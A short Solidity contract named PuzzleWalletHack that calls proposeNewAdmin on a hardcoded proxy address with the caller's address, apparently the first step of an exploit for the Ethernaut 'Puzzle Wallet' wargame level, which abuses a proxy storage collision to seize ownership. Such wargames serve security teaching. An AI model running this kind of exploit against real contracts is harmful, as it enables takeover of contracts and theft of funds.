// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IPuzzleProxy {
    function proposeNewAdmin(address) external;
}

contract PuzzleWalletHack {
    IPuzzleProxy puzzleProxy = IPuzzleProxy(0xF393Cb8Af1e3D1B7A060926b8D3E5800429785B7);

    function proposeNewAdmin() public {
        puzzleProxy.proposeNewAdmin(msg.sender);
    }
}
